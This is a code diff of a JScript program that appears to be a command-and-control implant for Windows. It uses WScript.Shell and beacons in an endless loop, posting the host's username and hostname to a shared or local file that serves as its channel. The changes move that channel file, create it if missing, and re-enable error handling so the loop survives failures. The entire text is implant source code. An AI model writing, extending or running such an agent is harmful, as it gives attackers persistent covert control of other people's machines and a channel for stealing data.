@@ -1,5 +1,5 @@
 //Define variables
-var home = 'C:\\users\\localadmin\\desktop\\test.txt' // UNC or local path. Send and receive data through this file
+var home = 'C:\\users\\kclark\\desktop\\test3.txt' // UNC or local path. Send and receive data through this file
 var sleepytime = 2000 //in milliseconds
 
 var runner = new ActiveXObject("WScript.Shell")
@@ -31,11 +31,24 @@ if(fso.FileExists(selfpath))
 }
 
 function smb_post(home, response) {
-  var fdr = fso.OpenTextFile(home)
-  var updata = fdr.ReadAll()
-  fdr.close()
+  if(!fso.FileExists(home)) {
+    var fd = fso.CreateTextFile(home)
+    fd.close()
+  }
 
-  if(updata !== checkin+"\r\n") { // Windows adds a \r\n at the end of file reads
+  var empty = false
+  var file = fso.GetFile(home)
+    if(file.Size !== 0) {
+      var fdr = fso.OpenTextFile(home)
+      var updata = fdr.ReadAll()
+      fdr.close()
+  }
+  else {
+    empty = true
+  }
+
+
+  if((empty) || (updata !== checkin+"\r\n")) { // Windows adds a \r\n at the end of file reads
     var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
     fdw.WriteLine(response)
     fdw.close()
@@ -125,8 +138,8 @@ fdw.close()
 
 while(true)
 {
-  //try
-  //{
+  try
+  {
     var retval = ""
     var recv_package = false
     var jsondata = smb_post(home, checkin);
@@ -267,10 +280,10 @@ while(true)
     if(!recv_package) {
       checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }';
     }
-  //}
-  //catch (e) {
-  //  WScript.Sleep(sleepytime);
-  //}
+  }
+  catch (e) {
+    WScript.Sleep(sleepytime);
+  }
   WScript.Sleep(sleepytime);
 }
 
